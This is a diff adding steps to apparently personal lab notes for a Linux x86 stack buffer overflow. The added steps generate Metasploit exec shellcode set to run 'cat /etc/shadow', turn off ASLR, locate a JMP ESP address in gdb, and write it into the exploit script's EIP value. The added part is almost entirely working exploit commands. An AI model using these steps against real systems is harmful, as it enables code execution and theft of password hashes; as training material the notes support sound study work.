@@ -823,23 +823,43 @@ print(Buffer + eip + nop)
 gdb-peda$ run <<< $(python linux_buffer.py)
 
 
+4. generate Shellcode
+--$ msfconsole
+msf6 > use payload/linux/x86/exec
+msf6 payload(linux/x86/exec) > show options
+msf6 payload(linux/x86/exec) > set CMD cat /etc/shadow
+msf6 payload(linux/x86/exec) > generate -b "\x00\x20\x0a\x0d" -f python
+#copy and paste all of the buf = b"" into the linux_buffer script under #Shellcode
+#add the buf variable to the print statement
 
+5. Acquire JMP ESP from target machine
+#Turn off ASLR  ##Its already turned off on the test
+sudo sysctl -w kernel.randomize_va_space=0
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+--$ env - gdb func
+(gdb) show env
+LINES=27
+COLUMNS=187
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env
+(gdb) run
+#Spam a lot of characters when prompted "Enter a string:"
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info proc map
+(gdb) find /b 0xf7de2000,0xffffe000,0xff,0xe4
+  #find <startaddr>,<endaddr>,0xff,0xe4
+  #fist hex after the heap
+  #last hex (before the stack)
+  #0xff 0xe4 = JMP ESP
+#take first six and go to script
+#alter the eip variable using little indian of one of the hex values taken
+#0xf7f65aff
+#f7 f6 5a ff
+#ff 5a f6 f7
+eip = "\xff\x5a\xf6\xf7"
+--$ sudo ./func <<< $(python linux_buffer_copy.py)
 
 
 
